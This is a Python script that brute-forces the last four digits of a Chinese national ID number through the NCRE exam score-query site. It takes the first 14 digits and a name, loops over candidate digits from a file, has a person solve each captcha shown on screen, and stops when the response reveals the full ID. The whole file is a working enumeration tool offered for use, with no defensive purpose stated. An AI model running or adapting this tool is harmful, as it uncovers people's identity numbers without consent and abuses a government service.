import requests,random,sys,time,re
import cv2
class yzm_crack(object):
    header ={
        'referer':'http://cjcx.neea.edu.cn/ncre/query.html',
        'host':'cjcx.neea.edu.cn',
        'user-agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0'
    }
    cookie_1 ={
        'BIGipServercache.neea.edu.cn_pool':'',         #此处填入浏览器cookie
        'UM_distinctid':''
    }
    cookie_2 ={
        'CNZZDATA1256596322':'',
        'community':'Home','UM_distinctid':''
    }
    post_url = 'http://cache.neea.edu.cn/report/query'
    req = requests.Session()
    def __init__(self,num,name):
        self.num = str(num)
        self.name = name
        self.url = 'http://cache.neea.edu.cn/Imgs.do?c=NCRE&ik='+self.num+'&t='
    def random_t(self):
        self.t = str(random.randint(1000000000000000,9999999999999999)/10000000000000000)  #生成16位0-1随机浮点数
        self.url +=self.t
    def req_yzm(self,number):
        url = 'http://cache.neea.edu.cn/Imgs.do?c=NCRE&ik='+self.num+number+'&t='
        r = self.req.get(url,headers = self.header,cookies = self.cookie_1)
        text = r.text.split('"')[1]
        yzm_pic = self.req.get(text,headers = self.header,cookies = self.cookie_2)
        with open('yzm.png','wb') as fp:
            fp.write(yzm_pic.content)
    def show_yzmimg(self):
        pic = cv2.imread("yzm.png")
        cv2.imshow("yzm",pic)
        if cv2.waitKey(0) == 32:             #使用opencv库显示图片，点击空格图片关闭输入图片中的验证码
            cv2.destroyAllWindows()
            self.text = input("验证码为:")
    def post_data(self,number):
        plo = re.compile(r'sfzh:\'证件号|[0-9]{18}\',')
        errt = re.compile('验证码错误')
        data = {
            'data':'NCRE,NCRE_1803,0,39,'+self.num+number+','+self.name,    #不同科目post的数据可浏览器抓包查看
            'iscerti':'',
            'v':self.text}
        req = self.req.post(self.post_url,data = data,cookies = self.cookie_1,headers = self.header)
        #print(data)
        #print(req.text)
        if plo.findall(req.text):                 #如尾数正确程序退出
            print('[*]Success\t'+data['data'])
            sys.exit()
        elif errt.findall(req.text):              #如验证码错误则返回非0字符串，进入循环
            print('[*]验证码错误')
            return 'error'
        else:                                     #如尾数错误进入下一次尝试
            return 0
    def run(self):
        with open('birth.txt','r') as fp:
            try:
                for imm in fp.readlines():
                #imm = '1215'
                    imm = imm.strip('\n')
                    self.random_t()
                    self.req_yzm(imm)
                    self.show_yzmimg()
                    er = self.post_data(imm)
                    while er:                    #判断返回值，如验证码错误则继续循环尝试当前尾数
                        self.random_t()
                        self.req_yzm(imm)
                        self.show_yzmimg()                
                        er = self.post_data(imm)
            except KeyboardInterrupt:
                print('[*]当前尝试尾数为：'+imm)  #^C退出时显示当前尾数，可手动删除txt文件中当前尾数前已尝试的数字
                sys.exit()
if __name__ == "__main__":
    crack_ncre = yzm_crack('','')     #传入身份证号前14位以及姓名
    crack_ncre.run()
        
        